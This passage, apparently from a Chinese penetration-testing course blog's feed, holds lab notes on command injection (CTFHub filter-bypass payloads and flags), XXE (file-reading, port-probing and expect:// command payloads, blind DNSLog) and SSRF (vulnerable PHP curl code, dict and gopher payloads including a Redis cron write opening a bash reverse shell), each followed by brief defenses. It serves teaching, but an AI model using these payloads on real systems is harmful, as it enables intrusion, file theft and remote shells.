class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>payload `127.0.0.1; cat flag_125721169614234.php` 查看网页源代码得到flag <?php // ctfhub{72e678ae7b15d51d5d3fec57}ctfhub{72e678ae7b15d51d5d3fec57}### 综合题http://challenge-6cc7d2ec0f8c9f8d.sandbox.ctfhub.com:10800<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">空格--&gt;$&#123;IFS&#125;flag--&gt;f***cat --&gt;more;--&gt;%0a回车 %0d换行（%0a是url的编码，需要在url栏输入）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>在url栏输入`127.0.0.1%0als`<pre class="line-numbers language-none"><code class="language-none">[9] &#x3D;&gt; flag_is_here[10] &#x3D;&gt; index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>payload `127.0.0.1%0acd${IFS}f***_is_here${IFS}%0als`<pre class="line-numbers language-none"><code class="language-none">[9] &#x3D;&gt; flag_319014724389.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>payload `127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_319014724389.php` 右键查看源码得到flag<?php // ctfhub{a869c0bcbdfae9fed49e3cb4}ctfhub{a869c0bcbdfae9fed49e3cb4}# RCE防御## 防御1. 开源框架，升级到最新版本2. 尽量不要使用命令执行的函数 3. 如果必须使用，需要做白名单处理4. 用正则表达式对用户输入的内容进行处理5. 使用WAF-->]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/16xxe/xxe/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/16xxe/xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>XML基础知识 </li><li>什么是XXE </li><li>XXE利用方式 </li><li>XXE防御</li></ol><h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage </p><p>可扩展标记语言</p><h2 id="XML用途"><a href="#XML用途" class="headerlink" title="XML用途"></a>XML用途</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><img src="/assets/image-20221125151509717.png" alt="image-20221125151509717"></p><h3 id="交换数据"><a href="#交换数据" class="headerlink" title="交换数据"></a>交换数据</h3><p><img src="/assets/image-20221125151538936.png" alt="image-20221125151538936"></p><h2 id="XML内容"><a href="#XML内容" class="headerlink" title="XML内容"></a>XML内容</h2><p><img src="/assets/image-20221125151603048.png" alt="image-20221125151603048"></p><h3 id="XML格式要求"><a href="#XML格式要求" class="headerlink" title="XML格式要求"></a>XML格式要求</h3><ul><li>XML文档必须有<strong>根元素</strong> </li><li>XML文档必须有<strong>关闭标签</strong></li><li>XML标签对<strong>大小写</strong>敏感 </li><li>XML元素必须被<strong>正确的嵌套</strong> </li><li>XML属性必须<strong>加引号</strong></li></ul><h3 id="XML格式校验"><a href="#XML格式校验" class="headerlink" title="XML格式校验"></a>XML格式校验</h3><p>DTD（Document Type Definition ） </p><p>文档类型定义</p><h3 id="DTD内容之元素"><a href="#DTD内容之元素" class="headerlink" title="DTD内容之元素"></a>DTD内容之元素</h3><p><img src="/assets/image-20221125151800051.png" alt="image-20221125151800051"></p><p>元素 ：ELEMENT</p><h3 id="DTD内容之实体"><a href="#DTD内容之实体" class="headerlink" title="DTD内容之实体"></a>DTD内容之实体</h3><p><img src="/assets/image-20221125151825720.png" alt="image-20221125151825720"></p><p>实体 ：ENTITY</p><h3 id="实体ENTITY的使用"><a href="#实体ENTITY的使用" class="headerlink" title="实体ENTITY的使用"></a>实体ENTITY的使用</h3><p><img src="/assets/image-20221125151901913.png" alt="image-20221125151901913"></p><p>内部实体 </p><p>INTERNAL [ɪnˈtɜːnl] ENTI</p><h3 id="外部实体ENTITY的使用"><a href="#外部实体ENTITY的使用" class="headerlink" title="外部实体ENTITY的使用"></a>外部实体ENTITY的使用</h3><p><img src="/assets/image-20221125155403447.png" alt="image-20221125155403447"></p><h3 id="外部实体引用：协议"><a href="#外部实体引用：协议" class="headerlink" title="外部实体引用：协议"></a>外部实体引用：协议</h3><table><thead><tr><th>协议</th><th>使用方式</th></tr></thead><tbody><tr><td>file</td><td>file:///etc//passwd</td></tr><tr><td>php</td><td>php://filter/read=convert.base64-encode/resource=index.php</td></tr><tr><td>http</td><td>http//:wuya.com/evil.dtd</td></tr></tbody></table><h5 id="不同语言支持的协议"><a href="#不同语言支持的协议" class="headerlink" title="不同语言支持的协议"></a>不同语言支持的协议</h5><table><thead><tr><th>Libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file http ftp</td><td>file http ftp php compress.zlib compress.bzip2 data glob phar</td><td>file http https ftp jar netdoc mailto gopher *</td><td>file http https ftp</td></tr></tbody></table><h5 id="PHP扩展"><a href="#PHP扩展" class="headerlink" title="PHP扩展"></a>PHP扩展</h5><table><thead><tr><th>Schema</th><th>Extension Required</th></tr></thead><tbody><tr><td>https ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell ssh2.exec ssh2.tunnel ssh2.sftp ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h3 id="完整的XML内容"><a href="#完整的XML内容" class="headerlink" title="完整的XML内容"></a>完整的XML内容</h3><p><img src="/assets/image-20221125165532725.png" alt="image-20221125165532725"></p><h1 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><img src="/assets/image-20221125165741902.png" alt="image-20221125165741902"></p><p>XML外部实体注入 </p><p>XML External Entity Injection</p><h2 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h2><p>如果Web应用的脚本代码没有限制XML引入外部实体，</p><p>从而导致用户可以插入一个<strong>外部实体</strong>，</p><p>并且其中的内容会被服务器端执行，</p><p>插入的代码可能导致:</p><ul><li>任意文件读取、</li><li>系统命令执行、</li><li>内网端口探测、</li><li>攻击内网网站等危害。</li></ul><p>读取文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>探测端口</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY xxe SYSTEM "http://192.168.31.193:8092"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行命令</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "expect://ipconfig"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="XXE利用方式"><a href="#XXE利用方式" class="headerlink" title="XXE利用方式"></a>XXE利用方式</h1><h2 id="微信支付XXE漏洞"><a href="#微信支付XXE漏洞" class="headerlink" title="微信支付XXE漏洞"></a>微信支付XXE漏洞</h2><p><img src="/assets/image-20221125175513874.png" alt="image-20221125175513874"></p><h2 id="微信支付XXE漏洞-1"><a href="#微信支付XXE漏洞-1" class="headerlink" title="微信支付XXE漏洞"></a>微信支付XXE漏洞</h2><p><img src="/assets/image-20221125175530987.png" alt="image-20221125175530987"></p><h2 id="直打：xxe靶场"><a href="#直打：xxe靶场" class="headerlink" title="直打：xxe靶场"></a>直打：xxe靶场</h2><p>访问：<a href="http://192.168.31.193:8093/php_xxe/">http://192.168.31.193:8093/php_xxe/</a></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><h4 id="确定使用XML传输数据（抓包可得）"><a href="#确定使用XML传输数据（抓包可得）" class="headerlink" title="确定使用XML传输数据（抓包可得）"></a>确定使用XML传输数据（抓包可得）</h4><p><img src="/assets/image-20221125184636443.png" alt="image-20221125184636443"></p><p><img src="/assets/image-20221125185102619.png" alt="image-20221125185102619"></p><h4 id="发送到Repeater"><a href="#发送到Repeater" class="headerlink" title="发送到Repeater"></a>发送到Repeater</h4><p><img src="/assets/image-20221125190021144.png" alt="image-20221125190021144"></p><h4 id="添加DTD，引用外部问文档"><a href="#添加DTD，引用外部问文档" class="headerlink" title="添加DTD，引用外部问文档"></a>添加DTD，引用外部问文档</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span>11  <span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>1  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Send得到响应"><a href="#Send得到响应" class="headerlink" title="Send得到响应"></a>Send得到响应</h4><p><img src="/assets/image-20221125185444129.png" alt="image-20221125185444129"></p><p><img src="/assets/image-20221125190115068.png" alt="image-20221125190115068"></p><h3 id="盲打-DNSLog"><a href="#盲打-DNSLog" class="headerlink" title="盲打-DNSLog"></a>盲打-DNSLog</h3><p><img src="/assets/image-20221125191451126.png" alt="image-20221125191451126"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % remote SYSTEM "http://test.bep1pi.dnslog.cn"&gt;%remote;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/assets/image-20221125191612095.png" alt="image-20221125191612095"></p><p><img src="/assets/image-20221125191645864.png" alt="image-20221125191645864"></p><h3 id="盲打-http接口参数，写入文件"><a href="#盲打-http接口参数，写入文件" class="headerlink" title="盲打-http接口参数，写入文件"></a>盲打-http接口参数，写入文件</h3><p><img src="/assets/image-20221125183019656.png" alt="image-20221125183019656"></p><h2 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><p><a href="http://192.168.70.130/vul/xxe/xxe_1.php">http://192.168.70.130/vul/xxe/xxe_1.php</a></p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0"?&gt;  &lt;!DOCTYPE foo [     &lt;!ENTITY xxe "哈哈" &gt; ]&gt;  &lt;foo&gt;&amp;xxe;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/assets/image-20221125194627357.png" alt="image-20221125194627357"></p><h1 id="XXE-防御"><a href="#XXE-防御" class="headerlink" title="XXE 防御"></a>XXE 防御</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>libxml_disable_entity_loader(true);</p><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>DocumentBuilderFactory dbf </p><p>=DocumentBuilderFactory.newInstance(); </p><p>dbf.setExpandEntityReferences(false);</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>from lxml import etree </p><p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h2 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h2><p><code>'</code> </p><p><code>"</code> </p><p><code>''(two apostrophe)</code> </p><p><code>""</code> </p><p><code>&lt; &gt;</code></p><p> <code>]]&gt;</code> </p><p><code>]]&gt;&gt;</code> </p><p><code>&lt;!--/--&gt;</code></p><p><code>/--&gt;</code> </p><p><code>--&gt;</code></p><p><code>&lt;!--</code> </p><p><code>&lt;!</code><br><code>&lt;! [CDATA[/]]</code></p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>以mod_security为例</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/15ssrf/ssrf/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/15ssrf/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>SSRF是什么 </li><li>SSRF常见场景 </li><li>如何发现SSRF漏洞 </li><li>如何防御SSRF漏洞</li></ol><h1 id="SSRF是什么"><a href="#SSRF是什么" class="headerlink" title="SSRF是什么"></a>SSRF是什么</h1><h3 id="CURL"><a href="#CURL" class="headerlink" title="CURL"></a>CURL</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置URL和相应的选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启用时会将头文件的信息作为数据流输出  </span>    <span class="token comment">// 抓取URL并把它传递给浏览器  </span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//关闭cURL资源，并且释放系统资源  </span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问百度：<a href="http://192.168.31.193:8091/ssrf1.php?url=www.baidu.com">http://192.168.31.193:8091/ssrf1.php?url=www.baidu.com</a></p><p>访问本地文件：<a href="http://192.168.31.193:8091/ssrf1.php?url=file:///c:/windows/win.ini">http://192.168.31.193:8091/ssrf1.php?url=file:///c:/windows/win.ini</a></p><h3 id="php的curl扩展"><a href="#php的curl扩展" class="headerlink" title="php的curl扩展"></a>php的curl扩展</h3><p>php.ini</p><p><code>extension=php_curl.dll</code></p><p>功能</p><p>获取网页资源——爬虫 </p><p>webservice——获取接口数据 </p><p>FTP——下载文件 </p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF (Server-Side Request Forgery) </p><p>服务器端请求伪造</p><h3 id="PHP其他函数"><a href="#PHP其他函数" class="headerlink" title="PHP其他函数"></a>PHP其他函数</h3><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>curl_exec()</td><td>执行cURL会话</td></tr><tr><td>file_get_contents()</td><td>将整个文件读入一个字符串</td></tr><tr><td>fsockopen()</td><td>打开一个网络连接或者一个Unix套 接字连接</td></tr></tbody></table><p>可能引起SSRF漏洞</p><h3 id="CURL其他协议"><a href="#CURL其他协议" class="headerlink" title="CURL其他协议"></a>CURL其他协议</h3><table><thead><tr><th>协议</th><th>作用</th><th>payload</th></tr></thead><tbody><tr><td>file</td><td>查看文件</td><td><code>curl -v 'file:///etc/password'</code></td></tr><tr><td>dict</td><td>探测端口</td><td><a href="http://192.168.31.193:8091/ssrf1.php?url=dict://192.168.31.193:3306">http://192.168.31.193:8091/ssrf1.php?url=dict://192.168.31.193:3306</a></td></tr><tr><td>gopher</td><td>反弹shell</td><td><code>curl -v 'gopher://192.168.31.193:8091/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d% 0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.142.135/4444 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3% 0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron /%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a $10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$ 4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'</code></td></tr></tbody></table><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p> dict协议：用于搭建在线字典服务</p><p> gopher协议：是一种信息查找系统，只支持文本，不支持图像，已被HTTP替代</p><h2 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h2><p>SSRF Server-Side Request Forgery </p><p>服务器端请求伪造：是一种由攻击者构造形成由<strong>服务端</strong>发起请求的一个安全漏洞。</p><p><img src="/assets/image-20221125133759679.png" alt="image-20221125133759679"></p><h2 id="危害（利用方式）"><a href="#危害（利用方式）" class="headerlink" title="危害（利用方式）"></a>危害（利用方式）</h2><ol><li>扫描资产 </li><li>获取敏感信息 </li><li>攻击内网服务器（绕过防火墙） </li><li>访问大文件，造成溢出 </li><li>通过Redis写入WebShell或建立反弹连接</li></ol><h1 id="SSRF常见场景"><a href="#SSRF常见场景" class="headerlink" title="SSRF常见场景"></a>SSRF常见场景</h1><h2 id="社会化分享功能"><a href="#社会化分享功能" class="headerlink" title="社会化分享功能"></a>社会化分享功能</h2><p><img src="/assets/image-20221125140125984.png" alt="image-20221125140125984"></p><p><img src="/assets/image-20221125140133352.png" alt="image-20221125140133352"></p><p>分享时，解析当前网页的标题等等</p><h2 id="转码服务"><a href="#转码服务" class="headerlink" title="转码服务"></a>转码服务</h2><p><img src="/assets/image-20221125140410419.png" alt="image-20221125140410419"></p><h2 id="在线翻译"><a href="#在线翻译" class="headerlink" title="在线翻译"></a>在线翻译</h2><p><img src="/assets/image-20221125140453736.png" alt="image-20221125140453736"></p><h2 id="图片加载、下载功能"><a href="#图片加载、下载功能" class="headerlink" title="图片加载、下载功能"></a>图片加载、下载功能</h2><p><img src="/assets/image-20221125140537017.png" alt="image-20221125140537017"></p><h2 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h2><p><img src="/assets/image-20221125140559729.png" alt="image-20221125140559729"></p><h2 id="网站采集、网站抓取"><a href="#网站采集、网站抓取" class="headerlink" title="网站采集、网站抓取"></a>网站采集、网站抓取</h2><p><img src="/assets/image-20221125140646947.png" alt="image-20221125140646947"></p><h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><ol><li>Wordpress 3.5.1以下版本 xmlrpc.php pingback的缺陷与SSFR </li><li>discuz!的SSRF（利用php的header函数来 绕过，其实就是302跳转实现协议转换） </li><li>weblogic的SSRF</li></ol><h1 id="如何发现SSRF漏洞"><a href="#如何发现SSRF漏洞" class="headerlink" title="如何发现SSRF漏洞"></a>如何发现SSRF漏洞</h1><ol><li>爬取地址 </li><li>查看是否请求了其他资源</li></ol><p>也可以用Google语法搜索关键字： </p><p>share、wap、url、link、src、source、target、u、 3g、display、sourceURL、imageURL、domain</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="SSRF-Testing"><a href="#SSRF-Testing" class="headerlink" title="SSRF-Testing"></a>SSRF-Testing</h3><p><a href="https://github.com/cujanovic/SSRF-Testing">https://github.com/cujanovic/SSRF-Testing</a> </p><h3 id="Gopherus"><a href="#Gopherus" class="headerlink" title="Gopherus"></a>Gopherus</h3><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><ol><li>MySQL (Port-3306)</li><li>PostgreSQL(Port-5432)</li><li>FastCGI (Port-9000)</li><li>Memcached (Port-11211)</li><li>Redis (Port-6379)</li><li>Zabbix (Port-10050)</li><li>SMTP (Port-25)</li></ol><h3 id="SSRFmap"><a href="#SSRFmap" class="headerlink" title="SSRFmap"></a>SSRFmap</h3><p><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/swisskyrepo/SSRFmapcd SSRFmap/pip3 install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用</p><pre class="line-numbers language-none"><code class="language-none">python3 ssrfmap.py  usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]  optional arguments:    -h, --help          show this help message and exit    -r REQFILE          SSRF Request file    -p PARAM            SSRF Parameter to target    -m MODULES          SSRF Modules to enable    -l HANDLER          Start an handler for a reverse shell    -v [VERBOSE]        Enable verbosity    --lhost LHOST       LHOST reverse shell    --lport LPORT       LPORT reverse shell    --uagent USERAGENT  User Agent to use    --ssl [SSL]         Use HTTPS without verification    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)    --level [LEVEL]     Level of test to perform (1-5, default: 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="如何防御SSRF漏洞"><a href="#如何防御SSRF漏洞" class="headerlink" title="如何防御SSRF漏洞"></a>如何防御SSRF漏洞</h1><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li>禁用协议 </li><li>限制请求端口 </li><li>设置URL白名单 </li><li>过滤返回信息 </li><li>统一错误信息</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/14-wen-jian-bao-han/wen-jian-bao-han/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/14-wen-jian-bao-han/wen-jian-bao-han/</url>
      
